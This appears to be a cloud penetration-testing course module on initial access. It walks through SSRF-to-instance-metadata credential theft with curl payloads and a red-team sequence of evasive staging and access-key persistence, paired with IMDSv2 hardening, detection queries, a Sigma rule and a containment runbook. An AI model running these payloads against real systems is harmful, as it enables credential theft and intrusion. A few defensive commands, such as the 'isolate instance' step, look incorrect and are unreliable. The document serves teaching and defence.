# 03 — Initial Access Vectors in Cloud

> **Level:** Intermediate
> **Prereqs:** [Methodology & PTES For Cloud](methodology-and-PTES-for-cloud.md), [Recon OSINT & Fingerprint](recon-osint-and-fingerprint.md); [Federation SSO & External Providers](../IAM/federation-sso-and-external-providers.md); [Git & CI/CD Leakage Paths](../Secrets-KMS/git-and-cicd-leakage-paths.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Initial Access (T1190, T1566, T1078, T1098), Credential Access
**Authorization scope:** Run only against your own sandbox accounts / sanctioned engagement with written authorization. All targets, ARNs, domains use placeholders. SSRF examples target `localhost` only.

## What & why
Initial access in cloud is overwhelmingly credential-first: leaked keys, SSRF-to-IMDS, OAuth phishing, and CI/CD compromise account for most real-world cloud intrusions. Unlike on-prem where RDP/SSH brute-force or software exploitation dominate, cloud attackers rarely need a binary exploit — the key *is* the entry.

## The OnPrem reality
Pre-cloud initial access meant phishing attachments, watering hole drive-bys, RDP brute-force, and exploitation of exposed services (SMB, RDP, VPN appliances). The attacker needed code execution on a host. In cloud, gaining valid credentials to the control plane is sufficient — you don't need a shell on an EC2 instance if you have an IAM access key.

## Core concepts

### Initial access vector catalogue

| Vector | Description | Prevalence | Difficulty |
|---|---|---|---|
| Leaked credentials (git/CI logs) | Hardcoded keys committed to public repos, CI output logs | Very High | Low (automated scanning) |
| SSRF → IMDS | Exploit internal app SSRF to hit `169.254.169.254` | High | Medium |
| Misconfigured public S3/blob/GCS | Public bucket with deployment artifacts containing secrets | High | Low |
| OAuth consent phishing (Illicit Consent Grant) | Trick user into granting OAuth app permissions | Medium | Low |
| Phishing cloud admin account | Credential harvesting of admin@example.com | Medium | Medium |
| Supply-chain CI/CD compromise | Malicious PR to CI pipeline exfiltrates secrets | Medium | Medium-High |
| Mis-scoped pre-signed URLs | Overly broad `PutObject` pre-signed URL allows bucket takeover | Medium | Medium |
| Exposed CloudFormation/Terraform state | State files in public S3 with resource outputs containing secrets | Medium | Low |
| Default/weak credentials | Root user without MFA, default service account keys | Low-Medium | Low |

## Cross-cloud initial access matrix

| IA Vector | AWS | Azure | GCP | OnPrem |
|---|---|---|---|---|
| Leaked credentials in git | IAM access key (`AKIAIOSFODNN7EXAMPLE`) in repo | SP secret or `AZURE_CLIENT_SECRET` in config | SA key JSON file committed | SSH private key in repo |
| SSRF → IMDS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name` | `http://169.254.169.254/metadata/identity/oauth2/token` (Azure Instance Metadata Service) | `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` | N/A (not cloud-native) |
| Public bucket with secrets | `s3://company-backups/terraform.tfstate` public | `https://storage.blob.core.windows.net/public/state.tf` | `https://storage.googleapis.com/public-bucket/key.json` | NFS share with cleartext secrets |
| OAuth phishing | AWS SSO OIDC app consent | Azure AD Illicit Consent Grant | GCP OAuth consent screen | NTLM relay to web app |
| CI/CD compromise | GitHub Actions `aws-actions/configure-aws-credentials` | Azure DevOps service connection | Google Cloud Build trigger | Jenkins credential store |
| Pre-signed URL abuse | `s3:PutObject` presigned URL with `*` key | SAS token with full `rwdl` permissions | Signed URL with `storage.objects.create` | N/A |
| CloudFormation/ARM/Bicep/Deployment Manager template | `cfn-response` with secrets | `outputs` in ARM template with key material | Deployment Manager config with secrets | Kickstart with keys |

## AWS

### SSRF → IMDS (contained example)

The canonical cloud IA attack chain:

```bash
# Step 0: The vulnerable app (for lab purposes, on localhost:8080)
# This app has SSRF — it fetches any URL you give it
curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 1: The app proxies the request to IMDS, which returns the role name
# Response: "vulnerable-ec2-role"

# Step 2: Fetch the credentials for that role
curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnerable-ec2-role"

# Response (placeholder):
# {
#   "Code": "Success",
#   "AccessKeyId": "ASIAXXXXXXXXXXXXEXAMPLE",
#   "SecretAccessKey": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
#   "Token": "IQoJb3JpZ2luX2VjEI...//...",
#   "Expiration": "2026-06-22T10:00:00Z"
# }

# Step 3: Use the stolen credentials
export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXXXXEXAMPLE
export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEI...//...

aws sts get-caller-identity
# {
#   "Account": "111111111111",
#   "Arn": "arn:aws:sts::111111111111:assumed-role/vulnerable-ec2-role/i-0abcdef1234567890"
# }

# Step 4: Recon with stolen role credentials
aws iam list-roles
aws s3 ls
```

**Artifacts left:** `GetCallerIdentity`, `ListRoles`, `s3:ListBuckets` in CloudTrail, sourced from the EC2 instance's VPC IP.

### Preventive control: IMDSv2

```bash
# Enforce IMDSv2 on all EC2 instances
aws ec2 modify-instance-metadata-options \
  --instance-id i-0abcdef1234567890 \
  --http-tokens required \
  --http-put-response-hop-limit 1

# SCP to require IMDSv2 for EC2 RunInstances
# (prevent launching instances with IMDSv1)
```

### Detection: SSRF → IMDS pattern

```sql
-- Athena query: stolen instance credentials used from unusual IP
SELECT eventtime, sourceipaddress, useridentity.arn, eventname
FROM cloudtrail_logs
WHERE useridentity.arn LIKE '%:assumed-role/%'
  AND sourceipaddress NOT IN (
    SELECT private_ip FROM ec2_instances_inventory
  )
  AND eventtime > now() - interval '1' day;
```

## Azure

### SSRF → Azure IMDS (contained example)

```bash
# Step 0: Vulnerable app on localhost:8080 with SSRF
# Step 1: Hit Azure IMDS — requires Metadata:true header
curl "http://localhost:8080/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com" \
  -H "Metadata: true"

# Response (placeholder):
# {"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOi...","expires_on":"1719000000","resource":"https://management.azure.com"}

# Step 2: Use the token
export AZURE_MI_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOi..."

curl -H "Authorization: Bearer $AZURE_MI_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2022-12-01"

# Step 3: List resources in the subscription
curl -H "Authorization: Bearer $AZURE_MI_TOKEN" \
  "https://management.azure.com/subscriptions/00000000-0000-0000-0000-000000000000/resources?api-version=2022-12-01"
```

**Artifacts left:** Azure Activity Log shows `Microsoft.ManagedIdentity` caller accessing management plane. Sign-in logs show managed identity token usage.

### Preventive controls

```bash
# Azure: enable managed identity usage monitoring via diagnostic settings
az monitor diagnostic-settings create \
  --name mi-audit \
  --resource /subscriptions/00000000-0000-0000-0000-000000000000 \
  --logs '[{"category":"Administrative","enabled":true}]'

# Block IMDS access from containers via NetworkPolicy
# (applied at AKS node level)
```

## GCP

### SSRF → GCP metadata (contained example)

```bash
# Step 0: Vulnerable app on localhost:8080 with SSRF
# Step 1: GCP metadata requires specific headers
curl "http://localhost:8080/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Response (placeholder):
# {"access_token":"ya29.c.b0AXv0zTP...","expires_in":3599,"token_type":"Bearer"}

# Step 2: Use the token
export GCP_TOKEN="ya29.c.b0AXv0zTP..."

curl -H "Authorization: Bearer $GCP_TOKEN" \
  "https://compute.googleapis.com/compute/v1/projects/example-project/zones/us-central1-a/instances"

# Step 3: Enumerate project
curl -H "Authorization: Bearer $GCP_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/example-project"
```

**Artifacts left:** Cloud Audit Logs show `compute.instances.list` and `resourcemanager.projects.get` from the instance's service account.

### Preventive controls

```bash
# GCP: disable default SA scopes, use dedicated SAs per workload
gcloud compute instances create secure-instance \
  --service-account=my-sa@example-project.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --no-default-service-account

# Block metadata access from containers with iptables on GKE nodes
# OR use Workload Identity (preferred)
```

## OnPrem mapping (recap table)

| IA Vector | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Credential leak | SSH key in git | IAM access key in git | SP secret in config | SA JSON key in git |
| SSRF → metadata | N/A | IMDSv1 vulnerable | Azure IMDS | GCE metadata server |
| Public storage secrets | Anonymous FTP | Public S3 bucket | Public blob container | Public GCS bucket |
| OAuth phishing | NTLM relay | AWS SSO consent grant | Illicit consent grant | GCP OAuth consent |
| CI/CD theft | Jenkins cred store | GitHub Actions secrets | Azure DevOps SP | Cloud Build trigger SA |
| Pre-signed URL abuse | N/A | S3 presigned URL | Blob SAS token | GCS signed URL |

## 🔴 Red Team view

### Contained IA scenario walkthrough: SSRF → IMDS → staging

1. **Discovery:** Run `nmap`-style HTTP scan against target web app. Find `/proxy?url=` endpoint with SSRF.

2. **Exploit:** Use SSRF to hit `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Retrieve `AccessKeyId`, `SecretAccessKey`, `SessionToken` for the instance role `arn:aws:iam::111111111111:role/app-server-role`.

3. **Staging:** Use stolen credentials to launch a t2.micro in a different region (`eu-west-1`) to avoid detection clustering. Tag it `Name=monitoring-agent` for blend-in.

4. **Persistence:** On the new instance, run `aws iam create-access-key --user-name legit-admin-user` if `app-server-role` has `iam:CreateAccessKey`.

**Containment:** Every step produces CloudTrail events. The `CreateAccessKey` step is the loudest — it appears under the legitimate admin user's user page in the console.

### Detection narrative

If the defender has:
- **IMDSv2 enforced** → SSRF fails at step 2 (requires PUT request + token).
- **CloudTrail data events on S3** → step 3's `RunInstances` + subsequent `s3:GetObject` visible.
- **GuardDuty** → `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` finding fires on step 2 if credentials used from outside AWS.
- **SCP: Deny iam:CreateAccessKey** → step 4 blocked outright.

## 🔵 Blue Team view

### Preventive control matrix for each IA vector

| IA Vector | Preventive Control | Detective Control | Response |
|---|---|---|---|
| Leaked credentials in git | Pre-commit hook (`git-secrets`, `truffleHog` on CI) | CloudTrail: `GetCallerIdentity` from new IP | Rotate key, audit usage window |
| SSRF → IMDS | Enforce IMDSv2 (`HttpTokens=required`); WAF block for metadata IP | GuardDuty: InstanceCredentialExfiltration | Revoke instance role session, isolate instance |
| Public bucket with secrets | Block Public Access (BPA) enabled; S3 `BlockPublicAccess=TRUE` | S3 data event: `GetObject` from non-corporate IP | Rotate all secrets in bucket, enable BPA |
| OAuth consent phishing | Admin consent required for all apps; publisher verification | Azure AD: `Consent to application` audit log entry | Revoke consent, reset affected user sessions |
| CI/CD compromise | OIDC federation (no long-lived keys); branch protection | CloudTrail: CI role doing `ListRoles` (unusual) | Revoke CI credentials, audit pipeline |
| Pre-signed URL abuse | Min presigned TTL (<1h); `s3:PutObject` with `prefix` condition | S3 data event: `PutObject` with unexpected key prefix | Revoke pre-signed URL, rotate bucket policy |

### Alert checklist for every IA

- [ ] Alert on `CreateAccessKey` for IAM users (vs. machine roles)
- [ ] Alert on `GetCallerIdentity` from IP not in corp CIDR
- [ ] Alert on `RunInstances` in a region never used before
- [ ] Alert on OAuth consent grant for unverified publisher
- [ ] Alert on `s3:GetObject` on `.tfstate` files from non-CI principal

### Containment runbook for SSRF → IMDS

1. **Isolate instance:** `aws ec2 modify-instance-attribute --instance-id <id> --no-disable-api-termination` + apply SG that denies all outbound.
2. **Revoke active sessions:** `aws iam list-roles` → identify instance role → detach all policies or `aws iam put-role-policy` to add explicit deny.
3. **Rotate all secrets** the role had access to.
4. **Forensic snapshot:** `aws ec2 create-snapshot --volume-id <vol>` for analysis.
5. **Post-mortem:** Identify the SSRF vulnerability in the application code.

## Hands-on lab

**Objective:** Simulate SSRF → IMDS in a contained sandbox environment and observe detection signals.

1. **Create a vulnerable test setup:**
   ```bash
   # Launch EC2 with IMDSv1 (for demonstration only)
   aws ec2 run-instances \
     --image-id ami-0c55b159cbfafe1f0 \
     --instance-type t2.micro \
     --iam-instance-profile Name=test-instance-profile \
     --metadata-options HttpTokens=optional \
     --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=ssrf-test}]'
   ```

2. **SSH into the instance** and simulate SSRF:
   ```bash
   # Imitate what an SSRF-vulnerable app would do
   TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
   ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
   curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
   ```

3. **Observe CloudTrail events:**
   ```bash
   aws cloudtrail lookup-events \
     --lookup-attributes AttributeKey=ResourceName,AttributeValue=ssrf-test \
     --max-results 20
   ```

4. **Enable GuardDuty** and check for `InstanceCredentialExfiltration` findings:
   ```bash
   aws guardduty list-findings --detector-id <detector-id>
   ```

5. **Hardening — switch to IMDSv2:**
   ```bash
   aws ec2 modify-instance-metadata-options \
     --instance-id <instance-id> \
     --http-tokens required \
     --http-endpoint enabled
   # Now repeat step 2 — it fails because IMDSv1 is blocked
   ```

**Expected output:** Working credential retrieval with IMDSv1; failure after IMDSv2 enforced.

**Teardown:**
```bash
aws ec2 terminate-instances --instance-ids <instance-id>
```

## Detection rules & checklists

### Sigma rule: SSRF metadata access attempt

```yaml
title: SSRF Metadata Service Access Attempt
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: RunInstances
    requestParameters.metadataOptions.httpTokens: optional
  condition: selection
fields:
  - userIdentity.arn
  - sourceIPAddress
  - awsRegion
falsepositives:
  - Legacy applications not yet migrated to IMDSv2
level: high
```

### Cloud Custodian: block IMDSv1 instances

```yaml
policies:
  - name: enforce-imdsv2
    resource: aws.ec2
    filters:
      - type: metadata-options
        key: HttpTokens
        value: optional
    actions:
      - type: notify
        template: imdsv2-violation
```

### CLI audit one-liners

```bash
# AWS: Find all instances with IMDSv1 enabled
aws ec2 describe-instances --query 'Reservations[].Instances[?MetadataOptions.HttpTokens==`optional`].[InstanceId,Tags[?Key==`Name`].Value|[0]]' --output table

# Azure: Check for MIs with overly broad roles
az vm identity show --name <vm-name> --resource-group <rg> --query '{principalId:principalId}'

# GCP: Check instances using default SA
gcloud compute instances list --filter='serviceAccounts.email~".*-compute@developer.gserviceaccount.com"'
```

## References

- [AWS IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [AWS GuardDuty InstanceCredentialExfiltration](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html)
- [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
- [GCP VM Metadata](https://cloud.google.com/compute/docs/metadata/overview)
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [truffleHog](https://github.com/trufflesecurity/trufflehog)
- [git-secrets](https://github.com/awslabs/git-secrets)
- [Illicit Consent Grant Attack](https://learn.microsoft.com/en-us/microsoft-365/enterprise/office-365-attack-detection-defender-for-office-365)
- See also: [IAM/credential-leak-pathways.md](../IAM/credential-leak-pathways.md)
